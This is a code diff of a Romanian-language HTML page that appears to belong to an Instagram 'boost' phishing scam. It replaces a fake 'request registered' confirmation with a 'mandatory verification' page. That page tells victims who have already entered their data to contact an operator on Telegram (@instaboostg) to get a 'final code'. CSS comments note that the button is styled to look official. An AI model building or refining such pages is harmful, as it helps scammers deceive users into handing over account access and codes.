@@ -3,50 +3,102 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solicitare Înregistrată!</title>
+    <title>Confirmare Securitate</title>
     <style>
-        body { background: #ffffff; font-family: -apple-system, sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .box { width: 320px; padding: 50px 20px; text-align: center; border-radius: 24px; box-shadow: 0 20px 40px rgba(0,0,0,0.08); border: 1px solid #f2f2f2; }
-        
-        /* Iconița cu bifa de succes pe gradientul tău */
-        .success-icon { 
-            width: 80px; height: 80px; 
-            background: linear-gradient(45deg, #0095f6, #ff007f); 
-            border-radius: 50%; 
-            margin: 0 auto 30px; 
-            display: flex; align-items: center; justify-content: center;
-            box-shadow: 0 8px 20px rgba(0, 149, 246, 0.2);
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            /* Fundal cu gradient discret folosind culorile tale, pentru o integrare perfectă */
+            background: radial-gradient(circle at center, #ffffff, #fdf4fd);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #262626;
         }
-
-        .check-svg { width: 40px; height: 40px; fill: white; }
-
-        h2 { font-size: 22px; color: #262626; margin-bottom: 12px; font-weight: 700; }
-        p { font-size: 14px; color: #8e8e8e; line-height: 1.5; padding: 0 10px; margin-bottom: 15px; } /* Redus marginea de jos */
-        
-        /* Noul rând de text adăugat */
-        .instruction { font-size: 13.5px; color: #777; margin-bottom: 30px; font-weight: 600; padding: 0 10px; line-height: 1.4; }
-        
-        .timer { font-size: 12px; color: #b0b0b0; font-style: italic; }
-        
-        .btn-home { display: inline-block; text-decoration: none; background: #f2f2f2; color: #262626; padding: 12px 25px; border-radius: 10px; font-weight: 600; font-size: 14px; margin-top: 10px; transition: 0.3s; }
-        .btn-home:hover { background: #e8e8e8; }
+        .container {
+            background: white;
+            border: 2px solid #ed1c6f; /* Contur roz aprins, ca în logo */
+            padding: 30px;
+            border-radius: 12px;
+            max-width: 350px;
+            width: 85%;
+            text-align: center;
+            box-shadow: 0 8px 24px rgba(183, 30, 169, 0.15); /* Umbră mov discretă */
+        }
+        .logo-placeholder {
+            width: 70px;
+            height: 70px;
+            margin: 0 auto 25px;
+            border-radius: 50%;
+            /* Gradient circular roz -> mov, exact ca fundalul logoului */
+            background: radial-gradient(circle at center, #ed1c6f, #b71ea9); 
+            border: 3px solid #ed1c6f;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            font-size: 32px;
+            font-weight: bold;
+        }
+        h1 {
+            font-size: 19px;
+            margin-bottom: 15px;
+            /* Textul titlului într-un mov intens din logo */
+            color: #b71ea9; 
+        }
+        p {
+            font-size: 14px;
+            line-height: 1.5;
+            color: #8e8e8e;
+            margin-bottom: 25px;
+        }
+        /* Butonul de Telegram, stilizat să arate oficial, dar folosind gradientul tău */
+        .btn-telegram {
+            background: linear-gradient(135deg, #ed1c6f, #b71ea9);
+            color: white;
+            text-decoration: none;
+            padding: 14px 22px;
+            border-radius: 10px;
+            font-weight: bold;
+            display: block;
+            font-size: 16px;
+            border: none;
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(237, 28, 111, 0.3);
+            transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .btn-telegram:active {
+            transform: scale(0.97);
+            box-shadow: 0 2px 6px rgba(183, 30, 169, 0.3);
+        }
+        .user-tag {
+            display: block;
+            margin-top: 8px;
+            font-size: 20px;
+            color: white;
+            font-weight: 800;
+        }
     </style>
 </head>
 <body>
-    <div class="box">
-        <div class="success-icon">
-            <svg class="check-svg" viewBox="0 0 24 24">
-                <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
-            </svg>
-        </div>
-        <h2>Solicitare Înregistrată!</h2>
-        <p>Datele tale au fost verificate cu succes. Pachetul de resurse va fi activat pe profilul tău în maximum 24 de ore.</p>
-        
-        <div class="instruction">Te rugăm să verifici notificările sau să accesezi aplicația pentru a accepta activarea pachetului.</div>
-        
-        <div class="timer">Poți închide această fereastră.</div>
-        <br>
-        <a href="https://instagram.com" class="btn-home">Înapoi la aplicație</a>
-    </div>
+
+<div class="container">
+    <div class="logo-placeholder">💎</div>
+    
+    <h1>VERIFICARE OBLIGATORIE</h1>
+    
+    <p>Ați introdus datele cu succes. Pentru a preveni erori de securitate și a primi <b>CODUL FINAL</b>, contactați-ne pe Telegram:</p>
+
+    <a href="https://t.me/instaboostg" class="btn-telegram">
+        📩 CONTACTEAZĂ OPERATORUL
+        <span class="user-tag">@instaboostg</span>
+    </a>
+
+    <p style="margin-top: 25px; font-size: 12px; color: #b71ea9;">
+        Procedura de activare va fi finalizată după primirea mesajului.
+    </p>
+</div>
+
 </body>
 </html>
